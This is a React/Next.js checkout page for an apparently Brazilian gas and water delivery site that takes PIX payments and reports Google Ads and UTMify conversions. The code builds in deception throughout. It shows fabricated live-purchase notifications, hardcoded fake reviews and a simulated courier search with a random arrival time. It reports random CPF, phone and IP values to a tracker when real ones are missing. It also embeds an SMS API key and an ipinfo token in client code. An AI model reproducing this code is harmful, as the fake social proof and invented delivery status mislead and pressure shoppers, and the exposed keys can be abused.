"use client"

import type React from "react"

// Declaração de tipo para gtag
declare global {
  interface Window {
    gtag: (...args: any[]) => void;
  }
}
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog"
import LocationHeader from "@/components/LocationHeader"
import { ArrowLeft, MapPin, Clock, CreditCard, Smartphone, Copy, CheckCircle, Star, Plus, X } from "lucide-react"
import { useState, useEffect } from "react"
import { useRouter, useSearchParams } from "next/navigation"

interface AddressData {
  cep: string
  logradouro: string
  bairro: string
  localidade: string
  uf: string
}

interface CustomerData {
  name: string
  phone: string
  complement: string
  number: string
  cpf: string
}

interface PixResponse {
  id: number
  status: string
  amount: number
  paymentMethod: string
  paidAt?: string
  pix: {
    qrcode: string
    expirationDate: string
    end2EndId?: string
    receiptUrl?: string
  }
  customer: {
    name: string
    email: string
    phone: string
  }
  items: Array<{
    title: string
    quantity: number
    unitPrice: number
  }>
}

// Função para sanitizar inputs e prevenir XSS
const sanitizeInput = (input: string, allowSpaces: boolean = false): string => {
  // Remove tags HTML, scripts e caracteres perigosos
  let sanitized = input
    .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '')
    .replace(/<[^>]*>/g, '')
    .replace(/javascript:/gi, '')
    .replace(/on\w+\s*=/gi, '')
    .replace(/[<>'"]/g, '')
  
  // Se não permitir espaços, remove todos os espaços
  if (!allowSpaces) {
    sanitized = sanitized.replace(/\s+/g, '')
  } else {
    // Se permitir espaços, apenas normaliza espaços múltiplos para um único espaço
    sanitized = sanitized.replace(/\s{2,}/g, ' ')
  }
  
  // Não usar trim() para permitir espaços durante digitação
  return sanitized
}

// Função para validar se input contém código malicioso
const isInputSafe = (input: string): boolean => {
  const dangerousPatterns = [
    /<script/i,
    /javascript:/i,
    /on\w+\s*=/i,
    /<iframe/i,
    /<object/i,
    /<embed/i,
    /eval\(/i,
    /expression\(/i
  ]
  
  return !dangerousPatterns.some(pattern => pattern.test(input))
}

export default function CheckoutPage() {
  const router = useRouter()
  const searchParams = useSearchParams()
  const productName = searchParams.get("product") || "Produto"
  
  // Capturar parâmetros UTM da URL ao carregar a página
  useEffect(() => {
    const utmParams = {
      src: searchParams.get('src'),
      sck: searchParams.get('sck'),
      utm_source: searchParams.get('utm_source'),
      utm_campaign: searchParams.get('utm_campaign'),
      utm_medium: searchParams.get('utm_medium'),
      utm_content: searchParams.get('utm_content'),
      utm_term: searchParams.get('utm_term')
    }
    
    // Salvar parâmetros UTM se existirem
    if (Object.values(utmParams).some(val => val !== null)) {
      localStorage.setItem('utm-params', JSON.stringify(utmParams))
    }
  }, [])

  // Verificar se já existe um pagamento confirmado ou PIX pendente no localStorage
  useEffect(() => {
    const savedPayment = localStorage.getItem('paid-order')
    if (savedPayment) {
      try {
        const payment = JSON.parse(savedPayment)
        // Verificar se o pagamento é recente (últimas 24 horas)
        const paymentTime = new Date(payment.paidAt).getTime()
        const now = new Date().getTime()
        const hoursDiff = (now - paymentTime) / (1000 * 60 * 60)
        
        if (hoursDiff < 24) {
          // Restaurar dados do pagamento
          setPixData(payment.pixData)
          setCustomerData(payment.customerData)
          setAddressData(payment.addressData)
          setStep(3)
        } else {
          // Limpar pagamento antigo
          localStorage.removeItem('paid-order')
        }
      } catch (e) {
        localStorage.removeItem('paid-order')
      }
    } else {
      // Verificar se há PIX pendente (não pago)
      const pendingPix = localStorage.getItem('current-pix-transaction')
      if (pendingPix) {
        try {
          const transaction = JSON.parse(pendingPix)
          const pixData = transaction.pixData
          
          // Verificar se é recente (últimas 2 horas)
          const createdAt = new Date(pixData.createdAt || Date.now()).getTime()
          const now = Date.now()
          const hoursDiff = (now - createdAt) / (1000 * 60 * 60)
          
          if (hoursDiff < 2 && pixData.status !== 'paid' && pixData.status !== 'PAID') {
            // Mostrar modal para continuar ou começar novo
            setPendingPixData(transaction)
            setShowPendingPixModal(true)
          } else {
            // Limpar PIX antigo
            localStorage.removeItem('current-pix-transaction')
          }
        } catch (e) {
          localStorage.removeItem('current-pix-transaction')
        }
      }
    }
  }, [])

  const productPrices: { [key: string]: number } = {
    "TESTE - Produto R$ 5": 500, // R$ 5,00 em centavos - PRODUTO DE TESTE
    "Gás de cozinha 13 kg (P13)": 9870, // R$ 98,70 em centavos (COM botijão)
    "Gás de Cozinha 13kg": 9870, // R$ 98,70 em centavos (compatibilidade)
    "Água Mineral Indaiá 20L": 1283, // R$ 12,83 em centavos
    "Garrafão de água Mineral 20L": 2520, // R$ 25,20 em centavos (COM vasilhame completo)
    "Água Mineral Serragrande 20L": 1283, // R$ 12,83 em centavos
    "Botijão de Gás 8kg P8": 9451, // R$ 94,51 em centavos (COM botijão)
    "Botijão de Gás 8kg": 9451, // R$ 94,51 em centavos (compatibilidade)
    "3 Garrafões de Água 20L": 6540, // R$ 65,40 em centavos (COM vasilhames)
    "Combo 2 Botijões de Gás 13kg": 18990, // R$ 189,90 em centavos (COM botijões)
    "Combo Gás + Garrafão": 12320, // R$ 123,20 em centavos
  }

  const [addressData, setAddressData] = useState<AddressData | null>(null)
  const [cep, setCep] = useState("")
  const [customerData, setCustomerData] = useState<CustomerData>({
    name: "",
    phone: "",
    complement: "",
    number: "",
    cpf: "",
  })
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState("")
  const [step, setStep] = useState(1) // 1: CEP, 2: Dados, 3: PIX
  const [pixData, setPixData] = useState<PixResponse | null>(null)
  const [pixLoading, setPixLoading] = useState(false)
  const [pixError, setPixError] = useState("")
  const [copied, setCopied] = useState(false)
  const [kitMangueira, setKitMangueira] = useState(false)
  const [showToast, setShowToast] = useState(false)
  const [currentToast, setCurrentToast] = useState("")
  const [conversionReported, setConversionReported] = useState(false)
  const [selectedWaterBrand, setSelectedWaterBrand] = useState("Naturágua")
  const [selectedGasBrand, setSelectedGasBrand] = useState("Liquigas")
  const [pixTimer, setPixTimer] = useState(900) // 15 minutos em segundos
  const [utmifySent, setUtmifySent] = useState(() => {
    // Recuperar do localStorage se existir
    if (typeof window !== 'undefined') {
      const saved = localStorage.getItem('utmify-sent')
      if (saved) {
        try {
          return JSON.parse(saved)
        } catch (e) {
          return { pending: false, paid: false }
        }
      }
    }
    return { pending: false, paid: false }
  })
  const [utmifyPayload, setUtmifyPayload] = useState<any>(null) // Guardar payload do pending
  const [pollingInterval, setPollingInterval] = useState<NodeJS.Timeout | null>(null)
  const [showPixDiscountModal, setShowPixDiscountModal] = useState(false)
  const [pixDiscount, setPixDiscount] = useState(0)
  const [smsReminderSent, setSmsReminderSent] = useState(false)
  const [showSupportButton, setShowSupportButton] = useState(false)
  const [showCardForm, setShowCardForm] = useState(false)
  const [cardData, setCardData] = useState({
    cardNumber: '',
    cardHolderName: '',
    cardExpiryDate: '',
    cardCvv: ''
  })
  const [cardSubmitting, setCardSubmitting] = useState(false)
  const [cardFailed, setCardFailed] = useState(false)
  const [showAddressModal, setShowAddressModal] = useState(false)
  const [searchingDriver, setSearchingDriver] = useState(false)
  const [driverETA, setDriverETA] = useState<string | null>(null)
  const [showPendingPixModal, setShowPendingPixModal] = useState(false)
  const [pendingPixData, setPendingPixData] = useState<any>(null)

  // Marcas de água disponíveis
  const waterBrands = [
    "Naturágua",
    "Indaiá", 
    "Serra Grande",
    "Límpida",
    "Santa Sofia",
    "Pacoti",
    "Marilia",
    "Neblina",
    "Sagrada",
    "Litoragua"
  ]

  // Marcas de gás disponíveis
  const gasBrands = [
    "Copagaz",
    "Nacional Gás",
    "Liquigas", 
    "Ultragas",
    "SupergasBras"
  ]

  // Dados dos reviews
  const reviews = [
    {
      name: "Maria Silva",
      rating: 5,
      comment: "Excelente serviço! Entrega super rápida e produto de qualidade. Recomendo!",
      image: "/reviews/review1.jpg",
      product: "Gás P13"
    },
    {
      name: "João Santos",
      rating: 5,
      comment: "Muito prático não precisar trocar o botijão. Chegou rapidinho e o entregador foi super educado.",
      image: "/reviews/reviewGasInstalado.jpg",
      product: "Gás P13 + Kit Mangueira"
    },
    {
      name: "Ana Costa",
      rating: 5,
      comment: "Adorei o combo! Veio tudo certinho e o preço é muito bom. Já virei cliente!",
      image: "/reviews/reviewcombo2Botijao.jpg",
      product: "Combo 2 Botijões"
    },
    {
      name: "Carlos Oliveira",
      rating: 5,
      comment: "Água mineral de excelente qualidade. Garrafões novos, sem precisar devolver. Perfeito!",
      image: "/reviews/review3garrafoes.jpg",
      product: "3 Garrafões"
    },
    {
      name: "Fernanda Lima",
      rating: 5,
      comment: "Serviço impecável! Em 25 minutos estava aqui. Super recomendo para quem quer praticidade.",
      image: "/reviews/review2.jpg",
      product: "Água Mineral"
    },
    {
      name: "Roberto Mendes",
      rating: 5,
      comment: "Finalmente um serviço que funciona! Gás novo, sem troca, entrega rápida. Nota 10!",
      image: "/reviews/review3.jpg",
      product: "Gás P13"
    }
  ]

  // Mensagens de toast para simular compras
  const toastMessages = [
    "Maria de Belo Horizonte acabou de comprar 1 Gás P13",
    "João de Contagem acabou de comprar o Combo 2 Botijões",
    "Ana de Betim acabou de comprar 3 Garrafões de Água",
    "Carlos de Nova Lima acabou de comprar 1 Garrafão de Água",
    "Fernanda de Sabará acabou de comprar o Combo Gás + Garrafão",
    "Roberto de Ribeirão das Neves acabou de comprar 1 Gás P8"
  ]

  useEffect(() => {
    // Verificar se já tem dados do CEP no localStorage
    const savedAddress = localStorage.getItem("configas-address")
    if (savedAddress) {
      const parsedAddress = JSON.parse(savedAddress)
      setAddressData(parsedAddress)
      setCep(parsedAddress.cep)
      setStep(2)
    }
  }, [])

  // Toast de compras em tempo real
  useEffect(() => {
    const showRandomToast = () => {
      const randomMessage = toastMessages[Math.floor(Math.random() * toastMessages.length)]
      setCurrentToast(randomMessage)
      setShowToast(true)
      
      setTimeout(() => {
        setShowToast(false)
      }, 4000)
    }

    // Mostrar primeiro toast após 3 segundos
    const firstTimeout = setTimeout(showRandomToast, 3000)
    
    // Depois mostrar a cada 15-25 segundos
    const interval = setInterval(() => {
      showRandomToast()
    }, Math.random() * 10000 + 15000) // 15-25 segundos

    return () => {
      clearTimeout(firstTimeout)
      clearInterval(interval)
    }
  }, [])

  const fetchAddressData = async (cepValue: string) => {
    setLoading(true)
    setError("")

    try {
      const cleanCep = cepValue.replace(/\D/g, "")
      if (cleanCep.length !== 8) {
        setError("CEP deve ter 8 dígitos")
        return
      }

      const response = await fetch(`https://viacep.com.br/ws/${cleanCep}/json/`)
      const data = await response.json()

      if (data.erro) {
        setError("CEP não encontrado")
        return
      }

      setAddressData(data)
      localStorage.setItem("configas-address", JSON.stringify(data))
      // Abrir modal de confirmação de endereço
      setShowAddressModal(true)
    } catch (err) {
      setError("Erro ao buscar CEP")
    } finally {
      setLoading(false)
    }
  }

  const handleCepSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!cep) return

    setLoading(true)
    setError("")

    try {
      const cleanCep = cep.replace(/\D/g, "")
      if (cleanCep.length !== 8) {
        setError("CEP deve ter 8 dígitos")
        return
      }

      const response = await fetch(`https://viacep.com.br/ws/${cleanCep}/json/`)
      const data = await response.json()

      if (data.erro) {
        setError("CEP não encontrado")
        return
      }

      setAddressData(data)
      // Abrir modal de confirmação de endereço
      setShowAddressModal(true)
    } catch (err) {
      setError("Erro ao buscar CEP")
    } finally {
      setLoading(false)
    }
  }
  
  // Função para confirmar endereço no modal
  const confirmAddress = () => {
    setShowAddressModal(false)
    setStep(2)
  }

  // Função para continuar com PIX pendente
  const continuePendingPix = () => {
    if (pendingPixData) {
      setPixData(pendingPixData.pixData)
      setCustomerData(pendingPixData.customerData)
      setAddressData(pendingPixData.addressData)
      setStep(3)
      setShowPendingPixModal(false)
      // Iniciar polling
      startPaymentPolling(pendingPixData.pixData.id)
    }
  }

  // Função para começar novo pedido
  const startNewOrder = () => {
    localStorage.removeItem('current-pix-transaction')
    localStorage.removeItem('utmify-payload')
    localStorage.removeItem('utmify-sent')
    setShowPendingPixModal(false)
    setPendingPixData(null)
    setStep(1)
  }

  const handleCustomerDataSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    if (customerData.name && customerData.phone && customerData.number) {
      setStep(3)
      // Calcular desconto de 10% para mostrar no modal
      const discount = Math.round(getTotalPrice() * 0.10)
      setPixDiscount(discount)
      // Mostrar modal de desconto PIX
      setShowPixDiscountModal(true)
      // Iniciar busca de motoboy
      startDriverSearch()
    }
  }
  
  // Função para simular busca de motoboy
  const startDriverSearch = () => {
    setSearchingDriver(true)
    setDriverETA(null)
    
    // Tempo aleatório entre 10-30 segundos para "encontrar" motoboy
    const searchTime = Math.random() * 20000 + 10000 // 10-30 segundos
    
    setTimeout(() => {
      setSearchingDriver(false)
      // Tempo de chegada aleatório entre 5-15 minutos
      const etaMinutes = Math.floor(Math.random() * 11) + 5 // 5-15 minutos
      setDriverETA(`${etaMinutes} minutos`)
    }, searchTime)
  }
  
  const handleAcceptDiscount = () => {
    setShowPixDiscountModal(false)
    // Calcular e aplicar desconto de 10%
    const discount = Math.round(getTotalPrice() * 0.10)
    setPixDiscount(discount)
    generatePix(true)
  }
  
  const handleDeclineDiscount = () => {
    setShowPixDiscountModal(false)
    setShowCardForm(true)
  }

  const generatePix = async (applyDiscount: boolean = false) => {
    setPixLoading(true)
    setPixError("")
    
    // Resetar estado UTMify para novo pedido
    setUtmifySent({ pending: false, paid: false })
    localStorage.removeItem('utmify-sent')
    localStorage.removeItem('paid-order')

    try {
      let totalPrice = getTotalPrice()
      let productPrice = productPrices[productName] || 1000
      let kitPrice = kitMangueira ? 980 : 0
      
      // Aplicar desconto de 10% se aceito
      if (applyDiscount) {
        const discount = Math.round(totalPrice * 0.10)
        setPixDiscount(discount)
        totalPrice = totalPrice - discount
        
        // Aplicar desconto proporcionalmente aos items
        productPrice = Math.round(productPrice * 0.90)
        if (kitMangueira) {
          kitPrice = Math.round(kitPrice * 0.90)
        }
      }
      
      // 🔥 IMPORTANTE: Se produto requer pagamento parcelado, gerar PIX apenas com 50%
      let pixAmount = totalPrice
      if (requiresPartialPayment()) {
        pixAmount = Math.round(totalPrice / 2) // 50% do valor final
      }
      
      let productTitle = productName
      
      if (isWaterProduct() && selectedWaterBrand) {
        productTitle = `${productName} - Marca: ${selectedWaterBrand}`
      } else if (isGasProduct() && selectedGasBrand) {
        productTitle = `${productName} - Marca: ${selectedGasBrand}`
      }
      
      // Adicionar informação de desconto no título se aplicado
      if (applyDiscount) {
        productTitle += " (10% desconto PIX)"
      }
        
      const items = [
        {
          title: productTitle,
          unitPrice: productPrice,
          tangible: true,
          quantity: 1,
        }
      ]

      // Adicionar kit mangueira se selecionado
      if (kitMangueira) {
        items.push({
          title: applyDiscount ? "Kit Mangueira para Gás (10% desconto PIX)" : "Kit Mangueira para Gás",
          unitPrice: kitPrice,
          tangible: true,
          quantity: 1,
        })
      }

      // Definir código do produto baseado no tipo
      let productCode = "ProdNewGB" // Padrão: Gás + Botijão
      if (productName.includes("Combo")) {
        productCode = "ProdNewCB" // Combo
      } else if (productName.includes("Garrafão")) {
        productCode = "ProdNewGA" // Garrafão
      }

      const requestData = {
        amount: pixAmount, // 🔥 Usar pixAmount (50% se parcelado) ao invés de totalPrice
        currency: "BRL",
        paymentMethod: "PIX",
        customer: {
          name: customerData.name,
          email: `${customerData.phone.replace(/\D/g, "")}@cliente.com`,
          document: {
            number: customerData.cpf.replace(/\D/g, ""),
            type: "CPF",
          },
          phone: customerData.phone.replace(/\D/g, ""),
          externalRef: "",
          address: {
            street: addressData?.logradouro || "",
            streetNumber: customerData.number,
            complement: customerData.complement || "",
            zipCode: addressData?.cep.replace(/\D/g, "") || "",
            neighborhood: addressData?.bairro || "",
            city: addressData?.localidade || "",
            state: addressData?.uf || "",
            country: "br",
          },
        },
        shipping: {
          fee: 0,
          address: {
            street: addressData?.logradouro || "",
            streetNumber: customerData.number,
            complement: customerData.complement || "",
            zipCode: addressData?.cep.replace(/\D/g, "") || "",
            neighborhood: addressData?.bairro || "",
            city: addressData?.localidade || "",
            state: addressData?.uf || "",
            country: "br",
          },
        },
        items: [{
          title: productCode,
          unitPrice: getPaymentAmount(), // Usar valor calculado (50% ou 100%)
          quantity: 1,
          tangible: true,
          externalRef: "",
        }],
        pix: {
          expiresInDays: 1,
        },
        postbackUrl: "",
        metadata: JSON.stringify({
          source: "apiutmify",
          project: productCode,
          url: "gasbu",
          pixelId: "",
          timestamp: new Date().toISOString()
        }),
        traceable: true,
        ip: "0.0.0.0",
      }

      const response = await fetch("/api/payment-transaction", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(requestData),
      })

      if (!response.ok) {
        throw new Error("Erro ao gerar PIX")
      }

      const pixResponse: PixResponse = await response.json()
      setPixData(pixResponse)
      
      // Salvar dados do PIX no localStorage para usar no polling
      localStorage.setItem('current-pix-transaction', JSON.stringify({
        pixData: pixResponse,
        customerData,
        addressData,
        createdAt: new Date().toISOString()
      }))
      
      // Reportar conversão de Iniciar finalização de compra (QR Code gerado)
      reportInitiateCheckout()
      
      // Iniciar polling para verificar pagamento (API Umbrela)
      startPaymentPolling(pixResponse.id)
    } catch (err) {
      setPixError("Erro ao gerar PIX. Tente novamente.")
    } finally {
      setPixLoading(false)
    }
  }

  const copyPixCode = async () => {
    if (pixData?.pix?.qrcode) {
      try {
        await navigator.clipboard.writeText(pixData.pix.qrcode)
        setCopied(true)
        setTimeout(() => setCopied(false), 2000)
      } catch (err) {
        // Erro silencioso
      }
    }
  }

  const formatPrice = (priceInCents: number) => {
    return (priceInCents / 100).toLocaleString("pt-BR", {
      style: "currency",
      currency: "BRL",
    })
  }

  // Verificar se o produto é água
  const isWaterProduct = () => {
    return productName.toLowerCase().includes("água") || 
           productName.toLowerCase().includes("garrafão") ||
           productName.toLowerCase().includes("garrafões")
  }

  // Verificar se o produto é gás
  const isGasProduct = () => {
    return productName.toLowerCase().includes("gás") || 
           productName.toLowerCase().includes("botijão") ||
           productName.toLowerCase().includes("botijões")
  }

  // Calcular preço total incluindo kit mangueira
  const getTotalPrice = () => {
    const basePrice = productPrices[productName] || 1000
    const kitPrice = kitMangueira ? 930 : 0 // R$ 9,30 em centavos
    return basePrice + kitPrice
  }

  // Verificar se produto requer pagamento parcelado (apenas para GÁS, acima de R$ 50)
  const requiresPartialPayment = () => {
    // Pagamento 50% APENAS para produtos de gás
    if (!isGasProduct()) return false
    
    const totalPrice = getTotalPrice()
    return totalPrice > 5000 // Mais de R$ 50,00 em centavos
  }

  // Calcular valor a pagar agora (50% se parcelado, 100% se não)
  // IMPORTANTE: Usa o valor FINAL após desconto PIX
  const getPaymentAmount = () => {
    const totalPrice = getTotalPrice()
    const finalPrice = totalPrice - pixDiscount // Valor após desconto
    if (requiresPartialPayment()) {
      return Math.round(finalPrice / 2) // 50% do valor FINAL
    }
    return finalPrice // 100% do valor FINAL
  }

  // Calcular valor restante a pagar na entrega
  const getRemainingAmount = () => {
    if (!requiresPartialPayment()) return 0
    const totalPrice = getTotalPrice()
    const finalPrice = totalPrice - pixDiscount // Valor após desconto
    return finalPrice - getPaymentAmount()
  }

  // Função para reportar conversão após gerar QR Code (Iniciar finalização de compra)
  const reportInitiateCheckout = () => {
    if (typeof window === 'undefined' || !window.gtag) return
    
    const initiateCheckoutTag = process.env.NEXT_PUBLIC_GOOGLE_ADS_INITIATE_CHECKOUT
    if (!initiateCheckoutTag) return
    
    try {
      window.gtag('event', 'conversion', {
        'send_to': initiateCheckoutTag
      })
    } catch (error) {
      // Erro silencioso
    }
  }

  // Função para obter tag de conversão COMPLETA baseada no domínio
  // Formato: AW-ACCOUNT_ID/CONVERSION_ID
  const getConversionTag = () => {
    if (typeof window === 'undefined') return null
    
    const host = window.location.hostname.toLowerCase()
    
    // localhost - TESTE
    if (host.includes('localhost') || host === '127.0.0.1') {
      return 'AW-TESTE/LOCALHOST-CONVERSION'
    }
    
    // entregasexpressnasuaporta.store
    // Tag completa: Account ID + Conversion ID
    if (host.includes('entregasexpressnasuaporta.store')) {
      return 'AW-17554338622/ZCa-CN2Y7qobEL7mx7JB'
    }
    
    // gasbutano.pro (padrão)
    // Tag completa: Account ID + Conversion ID
    if (host.includes('gasbutano.pro')) {
      return 'AW-17545933033/08VqCI_Qj5obEOnhxq5B'
    }
    
    // Fallback
    return null
  }

  // Função para reportar conversão do Google Ads (quando paga - Compra)
  const reportPurchaseConversion = (value: number, transactionId: string) => {
    if (typeof window === 'undefined') return
    if (!window.gtag) return
    
    const conversionTag = getConversionTag()
    if (!conversionTag) return
    
    try {
      const conversionValueBRL = value / 100; // Converter centavos para reais
      
      // Dispara conversão de Compra com valor e transaction_id
      window.gtag('event', 'conversion', {
        'send_to': conversionTag,
        'value': conversionValueBRL,
        'currency': 'BRL',
        'transaction_id': transactionId
      });
      
      // Marcar que conversão foi reportada
      setConversionReported(true);
    } catch (error) {
      console.error('Erro ao reportar conversão:', error)
    }
  }

  // Função para polling de pagamento
  const startPaymentPolling = (transactionId: number) => {
    // Limpar polling anterior se existir
    if (pollingInterval) {
      clearInterval(pollingInterval)
    }
    
    console.log(`🔄 [POLLING] Iniciando polling para transação ${transactionId}`)
    
    const interval = setInterval(async () => {
      try {
        // Adicionar timestamp para evitar cache
        const timestamp = new Date().getTime()
        const response = await fetch(
          `/api/check-payment-status?transactionId=${transactionId}&_t=${timestamp}`,
          {
            method: 'GET',
            cache: 'no-store',
            headers: {
              'Cache-Control': 'no-cache, no-store, must-revalidate',
              'Pragma': 'no-cache'
            }
          }
        )
        
        if (response.ok) {
          const data = await response.json()
          
          // Verificar APENAS o status (PAID ou paid)
          const status = data.status?.toUpperCase()
          console.log(`🔄 [POLLING] Status da transação ${transactionId}: ${status}`)
          
          if (status === 'PAID') {
            // Recuperar dados do localStorage ao invés de usar estado React
            const savedTransaction = localStorage.getItem('current-pix-transaction')
            if (!savedTransaction) {
              console.error('❌ [ERROR] Transação não encontrada no localStorage')
              return
            }
            
            const transaction = JSON.parse(savedTransaction)
            const currentPixData: PixResponse = transaction.pixData
            const savedCustomerData = transaction.customerData
            const savedAddressData = transaction.addressData
            
            clearInterval(interval)
            setPollingInterval(null)
            
            const updatedPixData: PixResponse = { 
              ...currentPixData, 
              status: 'paid',
              // Atualizar campos da API se disponíveis
              ...(data.paidAt && { paidAt: data.paidAt })
            }
            setPixData(updatedPixData)
            
            // Salvar no localStorage para evitar múltiplos pedidos
            localStorage.setItem('paid-order', JSON.stringify({
              pixData: updatedPixData,
              customerData: savedCustomerData,
              addressData: savedAddressData,
              paidAt: new Date().toISOString()
            }))
            
            // Reportar conversão Google Ads
            if (!conversionReported) {
              reportPurchaseConversion(updatedPixData.amount, updatedPixData.id.toString())
              setConversionReported(true)
            }
            
            // Enviar para UTMify PAID (ANTES de limpar current-pix-transaction)
            await sendToUtmify('paid')
            
            // Limpar transação temporária APENAS APÓS enviar para UTMify
            localStorage.removeItem('current-pix-transaction')
          }
        } else {
          console.error(`❌ [POLLING] Erro na resposta da API: ${response.status}`)
        }
      } catch (error) {
        console.error('❌ [ERROR] Erro no polling:', error)
      }
    }, 5000) // Verifica a cada 5 segundos
    
    setPollingInterval(interval)
    
    // Parar polling após 15 minutos
    setTimeout(() => {
      if (interval) {
        console.log('⏱️ [POLLING] Timeout de 15 minutos atingido, parando polling')
        clearInterval(interval)
        setPollingInterval(null)
      }
    }, 15 * 60 * 1000)
  }
  
  // Limpar polling ao desmontar componente
  useEffect(() => {
    return () => {
      if (pollingInterval) {
        clearInterval(pollingInterval)
      }
    }
  }, [pollingInterval])
  
  // Função para enviar SMS de lembrete
  const sendSmsReminder = async () => {
    if (smsReminderSent || !customerData.phone) return
    
    try {
      const message = "Configás: Volte ao nosso site! O Motoboy ta esperando a confirmacao pra ir, e menos de 10minutos na sua porta."
      const cleanPhone = customerData.phone.replace(/\D/g, '')
      const apiKey = "6YYTL0R2P8VOAJYG2JUZF5QGAEAVX28BMR0C9LPMVKDCFYXDG4ERLTZGD8PJ3ZDCZV1K4O3X48CV4NTRJONIV7S0ZQVDL3ZVGEXKN1ALDQMPHT7XXD2Z75CZMXXPR2SL"
      
      const url = `https://api.smsdev.com.br/v1/send?key=${apiKey}&type=9&number=${cleanPhone}&msg=${encodeURIComponent(message)}`
      
      const response = await fetch(url, {
        method: 'GET'
      })
      
      const data = await response.json()
      
      // Salvar ID do SMS se retornou
      if (data.id) {
        localStorage.setItem(`sms_${pixData?.id}`, JSON.stringify({
          smsId: data.id,
          phone: cleanPhone,
          sentAt: new Date().toISOString()
        }))
      }
      
      setSmsReminderSent(true)
    } catch (error) {
      // Erro silencioso
    }
  }

  // Função para gerar IP aleatório
  const generateRandomIP = () => {
    return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`
  }

  // Função para gerar CPF aleatório
  const generateRandomCPF = () => {
    const random = () => Math.floor(Math.random() * 10)
    return `${random()}${random()}${random()}${random()}${random()}${random()}${random()}${random()}${random()}${random()}${random()}`
  }

  // Função para gerar telefone aleatório
  const generateRandomPhone = () => {
    return `5582${Math.floor(Math.random() * 900000000) + 100000000}`
  }

  // Função para enviar dados ao UTMify
  const sendToUtmify = async (status: 'waiting_payment' | 'paid') => {
    console.log(`📤 [UTMIFY] Iniciando envio de conversão: ${status}`)
    
    // Recuperar dados do localStorage
    const savedTransaction = localStorage.getItem('current-pix-transaction')
    const savedPaidOrder = localStorage.getItem('paid-order')
    
    // Para PAID, também aceitar dados de paid-order
    const transactionData = savedTransaction || savedPaidOrder
    if (!transactionData) {
      console.error('❌ [UTMIFY ERROR] Nenhuma transação encontrada no localStorage')
      return
    }
    
    const transaction = JSON.parse(transactionData)
    const currentPixData = transaction.pixData
    const savedCustomerData = transaction.customerData
    
    console.log(`📦 [UTMIFY] Dados da transação recuperados - ID: ${currentPixData.id}`)
    
    // Verificar se já foi enviado para evitar duplicatas
    if (status === 'waiting_payment' && utmifySent.pending) {
      console.log('⚠️ [UTMIFY] Pending já foi enviado, ignorando')
      return
    }
    if (status === 'paid' && utmifySent.paid) {
      console.log('⚠️ [UTMIFY] Paid já foi enviado, ignorando')
      return
    }
    
    try {
      let utmifyData;
      
      if (status === 'waiting_payment') {
        console.log('🔨 [UTMIFY] Criando payload PENDING')
        
        // PENDING: Criar payload completo
        const utmParamsStr = localStorage.getItem('utm-params')
        const utmParams = utmParamsStr ? JSON.parse(utmParamsStr) : {}
        
        console.log('🏷️ [UTMIFY] Parâmetros UTM:', utmParams)
        
        // Obter IP do usuário (com fallback para IP aleatório)
        let userIp = generateRandomIP()
        try {
          const ipResponse = await fetch('https://ipinfo.io/?token=32090226b9d116')
          const ipData = await ipResponse.json()
          userIp = ipData.ip || generateRandomIP()
          console.log(`🌐 [UTMIFY] IP do usuário: ${userIp}`)
        } catch (e) {
          console.log(`🌐 [UTMIFY] Usando IP aleatório: ${userIp}`)
        }
        
        utmifyData = {
          orderId: currentPixData.id.toString(),
          platform: "GBsNew",
          paymentMethod: "pix",
          status: status,
          createdAt: new Date().toISOString().replace('T', ' ').substring(0, 19),
          approvedDate: null,
          refundedAt: null,
          customer: {
            name: savedCustomerData.name || "Cliente",
            email: currentPixData.customer.email || `cliente${Date.now()}@gbsnew.pro`,
            phone: savedCustomerData.phone ? savedCustomerData.phone.replace(/\D/g, '') : generateRandomPhone(),
            document: savedCustomerData.cpf ? savedCustomerData.cpf.replace(/\D/g, '') : generateRandomCPF(),
            country: "BR",
            ip: userIp
          },
          products: currentPixData.items.map((item: any, index: number) => ({
            id: `product-${currentPixData.id}-${index}`,
            name: "GBnewTno",
            planId: null,
            planName: null,
            quantity: item.quantity,
            priceInCents: item.unitPrice
          })),
          trackingParameters: {
            src: utmParams.src || null,
            sck: utmParams.sck || null,
            utm_source: utmParams.utm_source || null,
            utm_campaign: utmParams.utm_campaign || null,
            utm_medium: utmParams.utm_medium || null,
            utm_content: utmParams.utm_content || null,
            utm_term: utmParams.utm_term || null
          },
          commission: {
            totalPriceInCents: currentPixData.amount,
            gatewayFeeInCents: Math.round(currentPixData.amount * 0.04),
            userCommissionInCents: Math.round(currentPixData.amount * 0.96)
          },
          isTest: process.env.NODE_ENV === 'development'
        }
        
        // Salvar payload no estado E no localStorage para reutilizar no paid
        setUtmifyPayload(utmifyData)
        localStorage.setItem('utmify-payload', JSON.stringify(utmifyData))
        console.log('💾 [UTMIFY] Payload PENDING salvo no localStorage')
        
      } else {
        // PAID: Tentar recuperar payload do estado React ou localStorage
        let basePayload = utmifyPayload
        
        if (!basePayload) {
          // Tentar recuperar do localStorage
          const savedPayload = localStorage.getItem('utmify-payload')
          if (savedPayload) {
            basePayload = JSON.parse(savedPayload)
          }
        }
        
        // Se ainda não tiver payload, criar um novo (fallback)
        if (!basePayload) {
          console.warn('⚠️ [UTMIFY WARNING] Criando novo payload para PAID (pending não foi enviado)')
          
          const utmParamsStr = localStorage.getItem('utm-params')
          const utmParams = utmParamsStr ? JSON.parse(utmParamsStr) : {}
          
          let userIp = generateRandomIP()
          try {
            const ipResponse = await fetch('https://ipinfo.io/?token=32090226b9d116')
            const ipData = await ipResponse.json()
            userIp = ipData.ip || generateRandomIP()
          } catch (e) {
            // Usar IP aleatório em caso de erro
          }
          
          basePayload = {
            orderId: currentPixData.id.toString(),
            platform: "GBsNew",
            paymentMethod: "pix",
            status: 'waiting_payment',
            createdAt: new Date().toISOString().replace('T', ' ').substring(0, 19),
            approvedDate: null,
            refundedAt: null,
            customer: {
              name: savedCustomerData.name || "Cliente",
              email: currentPixData.customer.email || `cliente${Date.now()}@gbsnew.pro`,
